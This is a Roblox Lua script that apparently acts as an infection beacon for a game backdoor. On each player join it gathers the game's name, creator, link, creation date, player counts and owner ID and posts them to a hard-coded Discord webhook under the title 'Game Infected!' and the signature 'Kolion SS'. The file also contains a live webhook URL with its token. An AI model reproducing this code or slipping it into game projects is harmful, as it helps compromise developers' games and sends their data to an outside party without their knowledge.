if game:GetService("HttpService").HttpEnabled then
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local MarketplaceService = game:GetService("MarketplaceService")

	local webhookUrl = "https://discord.com/api/webhooks/1420520161517113356/v4Z0IlORt2pkV3-HNdh7mq2VxclhU2h3gcmZBTYAZ517IMy1dqTHbN-esNQ5hz8EHL9J" ---- new
	local function formatDate(isoDateString)
		local datePart = isoDateString:match("^(%d%d%d%d%-%d%d%-%d%d)")
		return datePart or isoDateString
	end

	local function sendWebhook(player)
		local success, gameInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if not success then
			warn("Failed to get game info: " .. tostring(gameInfo))
			return
		end

		local activePlayers = #Players:GetPlayers()
		local visitedPlayers = gameInfo.TotalVisits or 0

		local iconUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. tostring(game.PlaceId) .. "&width=150&height=150&format=png"
		local MaxPlr = game.Players.MaxPlayers

		local data = {
			username = "Kolion SS ❤‍🔥 ",
			embeds = {{
				title = "Game Infected!";
				fields = {
					{name = "> Game", value = "-> "..gameInfo.Name, inline = true},
					{name = "> Creator", value = "-> "..(gameInfo.Creator and gameInfo.Creator.Name) or "Unknown", inline = true},
					{name = "> Game Link", value = "-> ".."https://www.roblox.com/games/"..game.PlaceId, inline = false},
					{name = "> Created On", value = "-> "..formatDate(gameInfo.Created), inline = true},
					{name = "> Active Players", value = "-> "..tostring(activePlayers), inline = true},
					{name = "> Max Player", value = "-> "..tostring(activePlayers).."/"..MaxPlr, inline = true},
					{name = "> Owner ID", value = "-> "..game.CreatorId, inline = true},
				},
				footer = {
					text = "__Kolion Bot",
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}}
		}

		local jsonData = HttpService:JSONEncode(data)

		local ok, err = pcall(function()
			HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
		end)

		if not ok then
			warn("Failed to send webhook: " .. tostring(err))
		end
	end

	Players.PlayerAdded:Connect(function(player)
		sendWebhook(player)
	end)
else
	return warn("pls enable http")
end
